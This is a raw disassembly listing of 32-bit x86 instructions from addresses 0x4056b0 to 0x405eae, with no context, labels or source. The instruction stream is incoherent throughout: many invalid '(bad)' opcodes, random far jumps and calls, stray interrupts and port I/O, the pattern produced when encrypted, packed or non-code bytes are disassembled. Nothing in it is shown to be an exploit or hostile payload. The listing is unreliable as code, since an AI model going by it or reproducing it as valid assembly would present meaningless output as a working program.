  4056b0:	xchg   DWORD PTR [ecx-0x40],edi
  4056b3:	sbb    DWORD PTR [eax],0xebcbf7a4
  4056b9:	dec    eax
  4056ba:	or     esp,edi
  4056bc:	imul   edi,eax,0x20
  4056bf:	enter  0xbcf9,0xdb
  4056c3:	sbb    DWORD PTR [esi+0x72],eax
  4056c6:	jl     0x4056c5
  4056c8:	mov    BYTE PTR [edi+edi*1],ch
  4056cb:	mov    BYTE PTR [esi-0xd223ab3],al
  4056d1:	xchg   ecx,eax
  4056d2:	ds (bad) 
  4056d4:	fnstcw WORD PTR [edx+0x49]
  4056d7:	push   ds
  4056d8:	mov    esi,0x3b47d1f2
  4056dd:	in     al,dx
  4056de:	mov    ah,0x88
  4056e0:	js     0x4056f5
  4056e2:	push   es
  4056e3:	ss call 0x8a055706
  4056e9:	(bad)  
  4056ea:	fwait
  4056eb:	hlt    
  4056ec:	sub    eax,0xf5649790
  4056f1:	dec    edi
  4056f2:	repz mov edi,0x476e1c6b
  4056f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056f9:	arpl   dx,di
  4056fb:	scas   al,BYTE PTR es:[edi]
  4056fc:	mov    dl,0xfe
  4056fe:	dec    edx
  4056ff:	sub    eax,0x8bc9d12a
  405704:	cvtdq2ps xmm4,XMMWORD PTR [ebx+0x76f4efce]
  40570b:	pop    esp
  40570c:	rcl    eax,1
  40570e:	popa   
  40570f:	jmp    0xb791:0x906df50
  405716:	xor    dh,BYTE PTR [edi+ecx*8-0xf]
  40571a:	test   eax,0xa8578e65
  40571f:	mov    ah,0x1
  405721:	xchg   ebx,eax
  405722:	mov    eax,ebp
  405724:	pop    ds
  405725:	dec    edx
  405726:	(bad)  
  405727:	out    0xa3,al
  405729:	and    bh,BYTE PTR [ebp+0x2e16617a]
  40572f:	fucomi st,st(7)
  405731:	not    DWORD PTR [ecx]
  405733:	sub    cl,cl
  405735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405736:	repz daa 
  405738:	dec    ebx
  405739:	add    cl,dl
  40573b:	and    BYTE PTR [ecx+0x6bcffc36],bl
  405741:	xor    BYTE PTR [esi+0x6e],bh
  405744:	push   ebx
  405745:	xchg   edx,eax
  405746:	bound  edx,QWORD PTR [edx]
  405748:	ins    DWORD PTR es:[edi],dx
  405749:	int    0x9b
  40574b:	pop    es
  40574c:	arpl   WORD PTR [ebx-0x3f],dx
  40574f:	rol    DWORD PTR [edx],0x28
  405752:	cld    
  405753:	or     ch,dl
  405755:	(bad)  
  405756:	out    dx,eax
  405757:	inc    esi
  405758:	iret   
  405759:	in     eax,0xc8
  40575b:	imul   ebx,edi,0x67b985ae
  405761:	int    0x30
  405763:	inc    ebx
  405764:	or     eax,0x73e252a7
  405769:	jl     0x4057a9
  40576b:	lds    ebx,FWORD PTR [ebp+0x5fe2e7fe]
  405771:	outs   dx,BYTE PTR ds:[esi]
  405772:	les    eax,FWORD PTR [ecx-0x14]
  405775:	pushf  
  405776:	sbb    BYTE PTR [edx+0x6c8c8af4],al
  40577c:	xchg   esp,eax
  40577d:	cs mov cl,0x18
  405780:	cli    
  405781:	pop    edi
  405782:	jge    0x40574f
  405784:	shr    DWORD PTR [ecx],cl
  405786:	xor    al,0xbb
  405788:	gs stc 
  40578a:	jns    0x405738
  40578c:	mov    ebx,0x642cfab1
  405791:	jo     0x405753
  405793:	pushf  
  405794:	ss loop 0x405724
  405797:	scas   eax,DWORD PTR es:[edi]
  405798:	ror    DWORD PTR [ecx-0x12],1
  40579b:	jmp    0x40577e
  40579d:	popf   
  40579e:	hlt    
  40579f:	(bad)  
  4057a0:	pop    eax
  4057a1:	or     eax,0x5c04f946
  4057a6:	jl     0x4057d7
  4057a8:	loopne 0x4057a4
  4057aa:	inc    ebx
  4057ab:	out    dx,eax
  4057ac:	shr    DWORD PTR [ebx-0x7613f608],0x61
  4057b3:	ds dec ebp
  4057b5:	dec    eax
  4057b6:	repnz pop ebx
  4057b8:	mov    dl,0x6d
  4057ba:	sub    DWORD PTR es:[ebx-0x74],ecx
  4057be:	enter  0x864c,0xb3
  4057c2:	xor    ecx,edi
  4057c4:	sub    eax,0x487fdc00
  4057c9:	iret   
  4057ca:	scas   al,BYTE PTR es:[edi]
  4057cb:	and    eax,DWORD PTR [eax+0x6e]
  4057ce:	xchg   esi,eax
  4057cf:	ds sub al,0xc2
  4057d2:	cdq    
  4057d3:	and    eax,0xda233460
  4057d8:	iret   
  4057d9:	test   al,0xb3
  4057db:	add    eax,0x74a5b949
  4057e0:	jo     0x405819
  4057e2:	xor    al,0x4f
  4057e4:	adc    edx,esi
  4057e6:	jge    0x4057d1
  4057e8:	dec    ebx
  4057e9:	test   al,0xd6
  4057eb:	jmp    0xc18ffccc
  4057f0:	push   eax
  4057f1:	pop    edi
  4057f2:	jbe    0x4057be
  4057f4:	push   edx
  4057f5:	jecxz  0x405840
  4057f7:	sti    
  4057f8:	push   ebx
  4057f9:	jge    0x4057a2
  4057fb:	xchg   esi,eax
  4057fc:	loop   0x4057b2
  4057fe:	adc    ebp,edi
  405800:	loop   0x40578a
  405802:	xlat   BYTE PTR ds:[ebx]
  405803:	jg     0x4057b1
  405805:	adc    dh,BYTE PTR [ecx-0x10]
  405808:	sbb    bl,BYTE PTR [eax+0x2a]
  40580b:	mov    ebx,DWORD PTR [esi-0x17]
  40580e:	std    
  40580f:	lea    ecx,[ebp+0x7895a820]
  405815:	jle    0x4057d6
  405817:	fwait
  405818:	shr    BYTE PTR [esi+0x45],0xe8
  40581c:	adc    eax,0xff0d7f9a
  405821:	cld    
  405822:	jp     0x405852
  405824:	outs   dx,BYTE PTR ds:[esi]
  405825:	cli    
  405826:	mov    ?,WORD PTR [ebp+edi*4+0x7661c215]
  40582d:	cwde   
  40582e:	pop    edx
  40582f:	push   es
  405830:	retf   
  405831:	push   eax
  405832:	test   eax,0xf96046d2
  405837:	xor    al,ch
  405839:	xchg   ecx,eax
  40583a:	sahf   
  40583b:	mov    dh,0xe5
  40583d:	std    
  40583e:	call   0x12a0f9ab
  405843:	xor    BYTE PTR [edi-0x15],bh
  405846:	ins    DWORD PTR es:[edi],dx
  405847:	scas   al,BYTE PTR es:[edi]
  405848:	cli    
  405849:	and    edi,DWORD PTR [edx]
  40584b:	jmp    0xa706:0xf1007e51
  405852:	idiv   DWORD PTR [edi-0x1ea79e10]
  405858:	ret    0x4a14
  40585b:	cmc    
  40585c:	inc    ecx
  40585d:	leave  
  40585e:	out    dx,al
  40585f:	daa    
  405860:	lock hlt 
  405862:	(bad)  
  405863:	(bad)  
  405864:	inc    ecx
  405865:	in     al,dx
  405866:	stos   DWORD PTR es:[edi],eax
  405867:	jo     0x4058e3
  405869:	xchg   ecx,eax
  40586a:	icebp  
  40586b:	cmp    BYTE PTR ds:0x6b38075d,ch
  405871:	call   0xa8da5459
  405876:	call   0xada4:0xc5719e0f
  40587d:	mov    cs,WORD PTR [ecx]
  40587f:	arpl   WORD PTR [ebx-0x10],si
  405882:	cs out 0xbc,eax
  405885:	iret   
  405886:	inc    edi
  405887:	imul   edi,edi,0x26b2235a
  40588d:	jle    0x405861
  40588f:	ss fcomi st,st(1)
  405892:	shl    dl,1
  405894:	mov    eax,ds:0x2870c089
  405899:	in     al,0x2a
  40589b:	retf   
  40589c:	and    eax,0x4051d618
  4058a1:	mov    dl,0xf0
  4058a3:	stos   BYTE PTR es:[edi],al
  4058a4:	jge    0x40583b
  4058a6:	add    BYTE PTR [eax],0xe2
  4058a9:	jmp    0x4058b9
  4058ab:	mov    ch,0xca
  4058ad:	cs push ss
  4058af:	mov    ebx,0x37939d2c
  4058b4:	test   eax,0x48076300
  4058b9:	xor    cl,cl
  4058bb:	imul   eax,DWORD PTR [eax],0x4e
  4058be:	and    edi,ecx
  4058c0:	xor    al,0xee
  4058c2:	pop    ss
  4058c3:	mov    cl,0x2a
  4058c5:	pop    edi
  4058c6:	ret    0xd18
  4058c9:	enter  0xe1e0,0x85
  4058cd:	retf   
  4058ce:	push   eax
  4058cf:	gs aad 0x42
  4058d2:	push   es
  4058d3:	jp     0x405950
  4058d5:	sbb    ebx,DWORD PTR [eax]
  4058d7:	test   BYTE PTR [eax],dl
  4058d9:	ins    DWORD PTR es:[edi],dx
  4058da:	sbb    eax,0xec97a106
  4058df:	dec    ebx
  4058e1:	mov    ebx,0x3cc7a80c
  4058e6:	pop    ecx
  4058e7:	data16 int 0x6a
  4058ea:	xchg   DWORD PTR [eax],ebx
  4058ec:	mov    esi,0xf2654d4c
  4058f1:	dec    edi
  4058f2:	adc    ecx,DWORD PTR [ebx+0x203a1868]
  4058f8:	jle    0x405946
  4058fa:	icebp  
  4058fb:	scas   al,BYTE PTR es:[edi]
  4058fc:	mov    bh,BYTE PTR [ecx+eax*8]
  4058ff:	ins    DWORD PTR es:[edi],dx
  405900:	inc    esi
  405901:	es jg  0x4058b5
  405904:	or     ebx,esp
  405906:	xor    al,ah
  405908:	int    0x47
  40590a:	mov    bl,0xc2
  40590c:	jbe    0x40596d
  40590e:	mov    esp,ebp
  405910:	adc    BYTE PTR [ecx],dl
  405912:	sbb    dh,BYTE PTR [ebx+0x28a78785]
  405918:	das    
  405919:	ds (bad) 
  40591b:	out    0x6a,al
  40591d:	(bad)  
  40591e:	cmp    eax,0xf594ae1c
  405923:	jns    0x4058e6
  405925:	sbb    eax,0xe6a9e46c
  40592a:	fsub   QWORD PTR [esp+eax*4+0x46348b9e]
  405931:	mov    edx,0x61387cca
  405936:	mov    edi,0xd1619744
  40593b:	cmp    al,0xd9
  40593d:	imul   ecx,DWORD PTR ds:0x53c2d6,0x83a58315
  405947:	popf   
  405948:	jns    0x405912
  40594a:	inc    ebx
  40594b:	cld    
  40594c:	and    eax,0x702ac7ac
  405951:	jmp    0x8b69:0xfa5241e
  405958:	inc    ecx
  405959:	int    0x8e
  40595b:	inc    ebx
  40595c:	bound  edi,QWORD PTR [esp+esi*4]
  40595f:	jne    0x405965
  405961:	mov    ebx,0x541252bd
  405966:	push   es
  405967:	out    dx,eax
  405968:	(bad)  
  40596a:	js     0x4059e4
  40596c:	xchg   BYTE PTR [ebx-0x445061e3],bl
  405972:	cmp    edx,DWORD PTR [ebx+0xf]
  405975:	cmp    eax,0xc9f11e05
  40597a:	inc    eax
  40597b:	call   esi
  40597d:	pop    ebx
  40597e:	sub    edx,DWORD PTR [ebx-0x62]
  405981:	stc    
  405982:	int    0x8b
  405984:	xchg   ebx,eax
  405985:	pop    ss
  405986:	mov    ebx,0x9cdc6fd
  40598b:	dec    edi
  40598c:	push   es
  40598d:	add    eax,0xe1299a7c
  405992:	inc    esi
  405993:	cmp    al,0x5f
  405995:	jb     0x40593a
  405997:	test   eax,0xa9fa62b4
  40599c:	pop    esi
  40599d:	xchg   ebp,eax
  40599e:	(bad)  
  4059a0:	js     0x405986
  4059a2:	adc    bh,bh
  4059a4:	adc    esi,ebx
  4059a6:	push   ebp
  4059a7:	xor    BYTE PTR [eax+0x6650406d],dh
  4059ad:	cmp    dh,cl
  4059af:	inc    eax
  4059b0:	mov    ebp,0xb5ad1757
  4059b5:	test   DWORD PTR [ebp-0x1e],edi
  4059b8:	jmp    0xf1e:0x7e8b9e5f
  4059bf:	mov    bh,0x43
  4059c1:	loope  0x4059bf
  4059c3:	dec    eax
  4059c4:	pop    es
  4059c5:	outs   dx,DWORD PTR ds:[esi]
  4059c6:	lds    edi,FWORD PTR [ebx-0x6a]
  4059c9:	gs push ebx
  4059cb:	outs   dx,DWORD PTR ds:[esi]
  4059cc:	sbb    ah,BYTE PTR ds:0xa6c2a798
  4059d2:	retf   0x2adf
  4059d5:	jp     0x405969
  4059d7:	(bad)  
  4059d9:	jmp    0x405a54
  4059db:	jmp    0xe7bf:0xf13716b6
  4059e2:	lods   eax,DWORD PTR ds:[esi]
  4059e3:	shl    cl,1
  4059e5:	pushf  
  4059e6:	and    eax,0x29cc64e
  4059eb:	test   DWORD PTR [ebx+0x666959f7],edi
  4059f1:	cdq    
  4059f2:	test   eax,0xc533190d
  4059f7:	mov    bh,0x3a
  4059f9:	sub    BYTE PTR [ecx],bl
  4059fb:	call   0x25d3891d
  405a00:	scas   eax,DWORD PTR es:[edi]
  405a01:	iret   
  405a02:	mov    DWORD PTR [edx],ebx
  405a04:	add    al,0x6b
  405a06:	fcmovbe st,st(2)
  405a08:	cmp    bh,bh
  405a0a:	sub    DWORD PTR [eax-0x53a4ad08],esi
  405a10:	mov    esi,0xd7b727c0
  405a15:	(bad)  
  405a16:	(bad)  
  405a17:	cmp    bl,bl
  405a19:	pop    es
  405a1a:	out    dx,eax
  405a1b:	out    dx,eax
  405a1c:	cmp    ah,dh
  405a1e:	icebp  
  405a1f:	shl    BYTE PTR [ebp+edi*1+0x2c2f3233],cl
  405a26:	sbb    ecx,0x4c27bcf6
  405a2c:	sbb    DWORD PTR [edi+0x39e34a53],edx
  405a32:	bound  eax,QWORD PTR [ebx+0x2556321d]
  405a38:	dec    ecx
  405a39:	aaa    
  405a3a:	sub    esp,edi
  405a3c:	mov    DWORD PTR ds:0x51202b81,eax
  405a42:	shr    BYTE PTR [edi+eax*4+0x61f6e9f9],1
  405a49:	lock jmp 0xeecd:0xd75bb979
  405a51:	push   ss
  405a52:	repnz add eax,0xbee255ef
  405a58:	sbb    eax,0xaad46a2e
  405a5d:	inc    ebx
  405a5e:	mov    ebp,DWORD PTR [edi]
  405a60:	inc    ebp
  405a61:	pop    ebp
  405a62:	mov    al,ds:0x2e91de70
  405a67:	outs   dx,DWORD PTR ds:[esi]
  405a68:	cwde   
  405a69:	xor    al,0xf3
  405a6b:	jne    0x4059fe
  405a6d:	cmc    
  405a6e:	xchg   esp,eax
  405a6f:	sub    BYTE PTR [edi+0x43bb12d9],bl
  405a75:	sbb    ah,BYTE PTR [eax]
  405a77:	adc    dl,BYTE PTR ds:0x72d39d24
  405a7d:	(bad)  
  405a7e:	sti    
  405a7f:	jae    0x405ad5
  405a81:	repnz cmp al,0x34
  405a84:	pop    ebx
  405a85:	not    DWORD PTR [ebp+0x3a]
  405a88:	cmp    BYTE PTR [eax],bl
  405a8a:	(bad)  
  405a8b:	adc    DWORD PTR [esi],esp
  405a8d:	into   
  405a8e:	jecxz  0x405a22
  405a90:	push   ecx
  405a91:	sub    al,0x35
  405a93:	jne    0x405afa
  405a95:	jns    0x405aba
  405a97:	addr16 (bad) 
  405a99:	ja     0x405a80
  405a9b:	inc    edi
  405a9c:	stc    
  405a9d:	mov    ebx,0x90a25aef
  405aa2:	in     al,0xc6
  405aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aa5:	pop    edx
  405aa6:	sbb    al,0x39
  405aa8:	jne    0x405a8e
  405aaa:	xor    BYTE PTR [ecx+0x2b],ah
  405aad:	mov    WORD PTR [edi+0x3ce2f75e],?
  405ab3:	stos   DWORD PTR es:[edi],eax
  405ab4:	cmp    al,0x28
  405ab6:	repz cwde 
  405ab8:	mov    eax,DWORD PTR [ebp-0xa25977b]
  405abe:	mov    BYTE PTR [edi+0xc],dl
  405ac1:	out    dx,al
  405ac2:	scas   eax,DWORD PTR es:[edi]
  405ac3:	add    BYTE PTR [ecx+0x47d833e4],ch
  405ac9:	xchg   ecx,eax
  405aca:	jb     0x405a5e
  405acc:	inc    esi
  405acd:	ret    0x40b3
  405ad0:	add    al,0x3b
  405ad2:	mov    al,ds:0x1c673af2
  405ad7:	sbb    bh,0xa8
  405ada:	ins    DWORD PTR es:[edi],dx
  405adb:	test   BYTE PTR [esi-0x122c7cb9],0x93
  405ae2:	jmp    esp
  405ae4:	clc    
  405ae5:	cmp    ah,BYTE PTR [eax+ecx*4]
  405ae8:	adc    al,0xc3
  405aea:	shl    DWORD PTR [ecx],cl
  405aec:	getsec 
  405aee:	mov    bl,0xc0
  405af0:	and    esi,0xee8f017b
  405af6:	lahf   
  405af7:	inc    ecx
  405af8:	sbb    al,0x9c
  405afa:	sub    cl,BYTE PTR [esi-0x47]
  405afd:	jle    0x405b75
  405aff:	push   esi
  405b00:	mov    ecx,0x66b5c621
  405b05:	fidivr DWORD PTR [edi+ebp*4-0x35fb5ddc]
  405b0c:	mov    eax,0x7a554299
  405b11:	daa    
  405b12:	aaa    
  405b13:	das    
  405b14:	xor    al,0xf0
  405b16:	xchg   DWORD PTR [eax+edi*1+0xc847f29],ebp
  405b1d:	daa    
  405b1e:	div    DWORD PTR [esi+edx*1+0x2f]
  405b22:	xor    al,BYTE PTR [edi-0x1da7cf74]
  405b28:	sti    
  405b29:	js     0x405acd
  405b2b:	mov    ch,0xe3
  405b2d:	loopne 0x405b85
  405b2f:	repnz and BYTE PTR [edi-0x6a],0xa7
  405b34:	sti    
  405b35:	gs mov edx,0xe46a3939
  405b3b:	mov    dl,0x95
  405b3d:	lock repnz test eax,0x49025dcb
  405b44:	sbb    eax,0x865f0dd7
  405b49:	int3   
  405b4a:	push   esi
  405b4b:	push   eax
  405b4c:	popf   
  405b4d:	mov    al,ds:0xff114ecd
  405b52:	(bad)  
  405b53:	les    edx,FWORD PTR [esi-0x2b]
  405b56:	int    0x3a
  405b58:	jns    0x405b89
  405b5a:	hlt    
  405b5b:	mov    bl,0x9
  405b5d:	push   ecx
  405b5e:	mov    ebx,0xe119cd52
  405b63:	push   ecx
  405b64:	shl    DWORD PTR [ecx+0xf5f6e9a],1
  405b6a:	aad    0x58
  405b6c:	ficomp DWORD PTR [edx+0x1172258b]
  405b72:	retf   0x6389
  405b75:	xchg   DWORD PTR [edi+0x746bf18e],esi
  405b7b:	push   ecx
  405b7c:	inc    esp
  405b7d:	cmp    edi,ecx
  405b7f:	cwde   
  405b80:	pusha  
  405b81:	test   DWORD PTR [ebx-0x11],esi
  405b84:	(bad)  
  405b86:	fwait
  405b87:	mov    ecx,0x98c04f9a
  405b8c:	arpl   WORD PTR [esi],bx
  405b8e:	pop    ebx
  405b8f:	mov    ds,WORD PTR [eax-0x546d4817]
  405b95:	mov    BYTE PTR [edi+ecx*4+0x7131ca79],bl
  405b9c:	int3   
  405b9d:	div    dl
  405b9f:	mov    ah,0xbe
  405ba1:	pop    esi
  405ba2:	mov    eax,ds:0xc6848924
  405ba7:	pop    edx
  405ba8:	adc    ebp,DWORD PTR [edi+eiz*8+0xe]
  405bac:	add    BYTE PTR [edx],al
  405bae:	popf   
  405baf:	fstp   TBYTE PTR [edi-0x52]
  405bb2:	sbb    BYTE PTR [edx-0x28],bh
  405bb5:	mov    bh,0xbd
  405bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bb8:	outs   dx,DWORD PTR ds:[esi]
  405bb9:	cmp    DWORD PTR [ebp+0x77a39193],0x542a4df3
  405bc3:	(bad)  [esi+0x2c]
  405bc6:	imul   esi,DWORD PTR [edx],0x77a19106
  405bcc:	sub    DWORD PTR [ebx],0xfec72bd0
  405bd2:	idiv   BYTE PTR [ecx+0x71]
  405bd5:	cmp    DWORD PTR [esi],0xffffffbb
  405bd8:	jo     0x405c21
  405bda:	jg     0x405c39
  405bdc:	mov    DWORD PTR [eax],esp
  405bde:	stos   DWORD PTR es:[edi],eax
  405bdf:	xor    ah,ah
  405be1:	into   
  405be2:	xchg   al,bl
  405be4:	push   ss
  405be5:	jmp    0x342b:0x28c4d935
  405bec:	xlat   BYTE PTR ds:[ebx]
  405bed:	pop    esp
  405bee:	in     al,dx
  405bef:	(bad)  
  405bf1:	pop    esp
  405bf2:	adc    al,0x96
  405bf4:	pop    ebp
  405bf5:	mov    ds:0x4673602f,eax
  405bfa:	sub    al,0xdb
  405bfc:	mov    ah,0x96
  405bfe:	mov    eax,0x359f03d0
  405c03:	shl    DWORD PTR [eax+0x5c89e0a7],1
  405c09:	mov    ecx,0xf0d493a8
  405c0e:	fidiv  DWORD PTR [ebp-0x3f29ae71]
  405c14:	jg     0x405be7
  405c16:	jecxz  0x405c14
  405c18:	or     DWORD PTR ds:0xc6f40198,edi
  405c1e:	idiv   DWORD PTR [esi+0x0]
  405c21:	bound  edx,QWORD PTR [edx+edi*1-0x17]
  405c25:	bound  esi,QWORD PTR [ebp+0x538d0777]
  405c2b:	jmp    0x3577:0x1546681f
  405c32:	jo     0x405c12
  405c34:	adc    eax,0x3c900cd
  405c39:	mov    ds:0xf4a3a820,eax
  405c3e:	loope  0x405c16
  405c40:	mov    esi,0x34d99c12
  405c45:	push   esp
  405c46:	and    esp,DWORD PTR ds:0x5fa3a9a2
  405c4c:	lahf   
  405c4d:	jnp    0x405c2b
  405c4f:	push   ecx
  405c50:	mov    ah,0x1e
  405c52:	jno    0x405c55
  405c54:	push   esp
  405c55:	jo     0x405cc3
  405c57:	aad    0x19
  405c59:	imul   eax,DWORD PTR [edi],0xffffffa5
  405c5c:	and    al,0x39
  405c5e:	xchg   edx,eax
  405c5f:	iret   
  405c60:	jg     0x405c11
  405c62:	xor    dl,bl
  405c64:	sub    BYTE PTR [ebp+0x0],ch
  405c67:	mov    dx,0x5df4
  405c6b:	xor    bh,BYTE PTR [eax+0x6bafbeb8]
  405c71:	push   ebx
  405c72:	adc    al,0xad
  405c74:	fimul  WORD PTR [eax+0x4e]
  405c77:	sub    BYTE PTR [ebp+ebx*1-0x4cb59d84],bh
  405c7e:	jae    0x405cf1
  405c80:	jne    0x405ce2
  405c82:	daa    
  405c83:	sub    ch,bh
  405c85:	fwait
  405c86:	leave  
  405c87:	punpckhwd mm7,QWORD PTR [ebx+eax*2]
  405c8b:	push   0xffffffb0
  405c8d:	xor    al,0xd0
  405c8f:	jo     0x405c52
  405c91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c92:	repnz mov bh,0xc8
  405c95:	jno    0x405cd6
  405c97:	jg     0x405cd5
  405c99:	mov    al,0x47
  405c9b:	add    esi,DWORD PTR [edi+0x11]
  405c9e:	iret   
  405c9f:	jmp    0xa061717e
  405ca4:	push   ss
  405ca5:	aaa    
  405ca6:	cmp    al,0xf7
  405ca8:	fild   QWORD PTR [edi-0x77]
  405cab:	xchg   cl,bh
  405cad:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405caf:	ret    
  405cb0:	fisub  DWORD PTR [ebx-0x641e2a6f]
  405cb6:	in     eax,0x9e
  405cb8:	xchg   ebx,eax
  405cb9:	add    eax,0x221acfb
  405cbe:	inc    edx
  405cbf:	scas   al,BYTE PTR es:[edi]
  405cc0:	push   es
  405cc1:	and    DWORD PTR gs:[ebp-0x4f],edi
  405cc5:	xchg   DWORD PTR [ebx],eax
  405cc7:	jae    0x405cae
  405cc9:	into   
  405cca:	add    BYTE PTR [ecx],ah
  405ccc:	push   esi
  405ccd:	dec    esp
  405cce:	outs   dx,DWORD PTR ds:[esi]
  405ccf:	stos   DWORD PTR es:[edi],eax
  405cd0:	mov    ds:0x17426297,eax
  405cd5:	pushf  
  405cd6:	retf   0x2a50
  405cd9:	ret    
  405cda:	sub    dh,0xdd
  405cdd:	push   ss
  405cde:	xor    DWORD PTR ss:[ebx-0x2100c397],0xffffffe0
  405ce6:	inc    bx
  405ce8:	test   BYTE PTR [edx-0x5435cae4],ch
  405cee:	mov    edi,0xd368e792
  405cf3:	das    
  405cf4:	and    edi,edi
  405cf6:	jns    0x405d6e
  405cf8:	out    0x30,eax
  405cfa:	sub    BYTE PTR [ecx+0xa89ab89],bh
  405d00:	sub    edx,edx
  405d02:	pop    edx
  405d03:	(bad)  
  405d04:	imul   eax,DWORD PTR [eax],0xe96b6945
  405d0a:	adc    ebp,DWORD PTR [eax]
  405d0c:	aad    0xa9
  405d0e:	jb     0x405d82
  405d10:	mov    al,0x57
  405d12:	jmp    0x7bbc346b
  405d17:	call   0xc388:0x67f4d515
  405d1e:	jns    0x405cf3
  405d20:	cmovl  esi,esp
  405d23:	push   es
  405d24:	jbe    0x405ce9
  405d26:	xchg   edx,eax
  405d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d28:	imul   ebp,DWORD PTR es:[edi],0x8da78aec
  405d2f:	adc    eax,0x5695133e
  405d34:	jae    0x405d31
  405d36:	(bad)  
  405d37:	fsub   DWORD PTR [ecx-0x6ff33437]
  405d3d:	pop    ds
  405d3e:	lahf   
  405d3f:	mov    esi,es
  405d41:	jbe    0x405d41
  405d43:	loop   0x405d4f
  405d45:	mov    ebp,0x56f59d2c
  405d4a:	jl     0x405ce3
  405d4c:	mov    eax,ds:0x7c6e9ca6
  405d51:	push   ss
  405d52:	mov    esp,0xb67e153d
  405d57:	dec    ebx
  405d58:	ficomp WORD PTR [bp-0x44]
  405d5c:	fld    DWORD PTR [edi+0x62]
  405d5f:	sahf   
  405d60:	inc    ecx
  405d61:	pop    edi
  405d62:	test   dh,cl
  405d64:	gs push eax
  405d66:	cs cld 
  405d68:	and    eax,0x1a2b82d7
  405d6d:	add    al,BYTE PTR [ebp+0x71]
  405d70:	ins    DWORD PTR es:[edi],dx
  405d71:	sahf   
  405d72:	xchg   edx,esp
  405d74:	repnz jecxz 0x405d60
  405d77:	sub    dl,al
  405d79:	cmp    BYTE PTR [ebx],cl
  405d7b:	add    bh,cl
  405d7d:	and    dh,dl
  405d7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d80:	xor    BYTE PTR [ebp-0x37676f1e],cl
  405d86:	pushf  
  405d87:	mov    dh,0x23
  405d89:	cmp    dl,BYTE PTR [edx-0x19]
  405d8c:	ins    BYTE PTR es:[edi],dx
  405d8d:	jp     0x405dd0
  405d8f:	loop   0x405d49
  405d91:	repz fadd st(5),st
  405d94:	dec    ecx
  405d95:	shr    DWORD PTR [ebx],0xb9
  405d98:	mov    eax,ds:0xf9eeb2c9
  405d9d:	inc    eax
  405d9e:	nop
  405d9f:	pop    edx
  405da0:	adc    al,0x25
  405da2:	in     al,dx
  405da3:	sahf   
  405da4:	out    0x6,al
  405da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405da7:	fisub  DWORD PTR [ebx+0x6b5656a5]
  405dad:	clc    
  405dae:	(bad)
  405db2:	imul   eax,DWORD PTR [edi+0x1f],0x4f
  405db6:	call   0xbaa7:0x2325bb8
  405dbd:	lahf   
  405dbe:	or     BYTE PTR [esi-0x3e],dh
  405dc1:	repz dec edx
  405dc3:	xchg   edx,eax
  405dc4:	ins    BYTE PTR es:[edi],dx
  405dc5:	add    al,0x93
  405dc7:	sar    DWORD PTR [esi+0x39],1
  405dca:	fisubr WORD PTR [ebx]
  405dcc:	lds    edi,FWORD PTR [eax-0x42]
  405dcf:	ret    0x8d5e
  405dd2:	fcomp  QWORD PTR [esi-0x57]
  405dd5:	fsub   DWORD PTR [ecx]
  405dd7:	cmp    BYTE PTR [edx+ecx*1-0x2acb9beb],0x32
  405ddf:	mov    ah,BYTE PTR [ecx+eiz*1]
  405de2:	(bad)  
  405de3:	adc    ebp,DWORD PTR [di]
  405de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de7:	(bad)  
  405de8:	mov    ah,0x2e
  405dea:	add    al,0xa3
  405dec:	dec    ecx
  405ded:	inc    ebp
  405dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405def:	imul   ebp,DWORD PTR ds:0x9f44b3f8,0xe90f25be
  405df9:	xor    DWORD PTR [ebx+0x4afca7e5],edi
  405dff:	jne    0x405dd6
  405e01:	xor    BYTE PTR [eax],0x98
  405e04:	jns    0x405df0
  405e06:	pusha  
  405e07:	rcr    al,0xb3
  405e0a:	sub    dh,ah
  405e0c:	xchg   esp,esi
  405e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e0f:	mov    dh,BYTE PTR [edx-0x5d]
  405e12:	or     eax,0x4293cc56
  405e17:	out    dx,al
  405e18:	and    BYTE PTR [edx],bl
  405e1a:	cmp    DWORD PTR [ecx-0x14571dc7],ebp
  405e20:	jb     0x405e9b
  405e22:	in     eax,0x34
  405e24:	std    
  405e25:	mov    edi,0x959b0ed1
  405e2a:	push   0x4d672abd
  405e2f:	xchg   ecx,eax
  405e30:	sbb    DWORD PTR [edx-0x37],0xf964114a
  405e37:	lods   al,BYTE PTR ds:[esi]
  405e38:	dec    eax
  405e39:	aas    
  405e3a:	les    edi,FWORD PTR [edi+0x69]
  405e3d:	ss cs mov esp,0xf8028303
  405e44:	xor    eax,0x39e91c5f
  405e49:	mov    ds:0x99f98686,al
  405e4e:	push   edi
  405e4f:	sub    BYTE PTR [ebx-0x3fb81005],0x8e
  405e56:	pop    ebp
  405e57:	inc    ebx
  405e58:	rcr    DWORD PTR [ebp+0x4c],0xe5
  405e5c:	sbb    eax,0xfd3b0be3
  405e61:	pushf  
  405e62:	ret    
  405e63:	arpl   WORD PTR [ebx+eax*8],bx
  405e66:	dec    edi
  405e67:	cmc    
  405e68:	mov    al,ds:0x22aafd4
  405e6d:	xchg   sp,ax
  405e6f:	cs push eax
  405e71:	cmc    
  405e72:	sbb    eax,DWORD PTR [esi+0x6e]
  405e75:	loopne 0x405edd
  405e77:	in     al,0x92
  405e79:	cmp    eax,0x43fab2c1
  405e7e:	ins    BYTE PTR es:[edi],dx
  405e7f:	repz adc ebp,edi
  405e82:	jmp    0xca3b3d4c
  405e87:	ss jb  0x405f04
  405e8a:	jb     0x405e15
  405e8c:	adc    bl,ah
  405e8e:	xor    eax,0x87091b33
  405e93:	pop    edi
  405e94:	in     eax,0xa8
  405e96:	jge    0x405eea
  405e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e99:	xchg   BYTE PTR [esi+eiz*8-0x74],al
  405e9d:	push   cs
  405e9e:	test   DWORD PTR [edi-0x47f3ffe3],0xe68ce661
  405ea8:	adc    BYTE PTR [edx+0x51],cl
  405eab:	es xor esp,edi
  405eae:	lahf   
